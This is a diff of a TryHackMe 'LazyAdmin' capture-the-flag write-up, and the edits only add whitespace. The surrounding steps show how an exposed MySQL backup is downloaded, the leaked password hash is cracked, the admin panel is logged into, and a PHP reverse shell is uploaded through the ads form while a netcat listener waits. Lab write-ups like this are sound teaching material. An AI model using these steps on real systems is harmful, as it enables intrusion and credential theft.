@@ -116,9 +116,11 @@ DOWNLOADED: 13836 - FOUND: 4
 6. `firefox "http://{TARGET IP}/content/inc` to launch Firefox and redirect it to the target's **/content/inc** directory
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/inc.png)
+
 7. `firefox "http://{TARGET IP}/content/inc/mysql_backup/"` to launch Firefox and redirect it to the target's **/content/inc/mysql_backup** directory and download the MySQL backup file
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/mysql_backup.png)
+
 8. `cd ~/Downloads` to change to the **~/Downloads** directory on our machine since that's where our MySQL backup file should be
 9. `ls` to verify if the file has been successfully downloaded onto our machine, which it has
 10. `cat {BACKUP FILE}.sql` to output the backup file's contents onto our terminal, which outputs what seemed to be a bunch of SQL queries that can be used to create tables, and if we look a bit closer, we can see that this file contains a username and that username's password hash
@@ -241,6 +243,7 @@ DOWNLOADED: 13836 - FOUND: 4
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Crackstation.png)
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Crackstation%20Password%20Cracked.png)
+
 13. `firefox "http://{TARGET IP}/content/as"` to launch Firefox and redirect it to the target's **/content/as**, which turned out to be a login page, for which we can log in to using the new set of credentials that we found and cracked
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/as.png)
@@ -250,6 +253,7 @@ DOWNLOADED: 13836 - FOUND: 4
 13. `firefox "http://10.10.165.242/content/as/?type=ad"` to launch Firefox and redirect it to the **/content/as/?type=ad** page to see if anything that we create and upload here will be uploaded into the **/content/inc/ads** directory that we saw earlier in the **/content/inc** directory
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Test%20Ad.png)
+
 14. `firefox "http://{TARGET IP}/content/inc/ads"` to launch Firefox and redirect it to **/content/inc/ads** directory to see if the test ad that we created and uploaded gets saved here, which it did as a PHP (.php) file
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Test%20Ad%20Success.png)
@@ -300,6 +304,7 @@ listening on [any] 9999 ...
 17 `firefox "http://10.10.165.242/content/as/?type=ad"` Copy paste the contents of **php-reverse-shell.php** into the "**Ads code**" input form and give it any name you want
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Reverse%20Shell%20Ad%20.png)
+
 19. `firefox "http://10.10.165.242/content/inc/ads/"` and click on it
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/PHP%20Reverse%20Shell%20Uploaded.png)
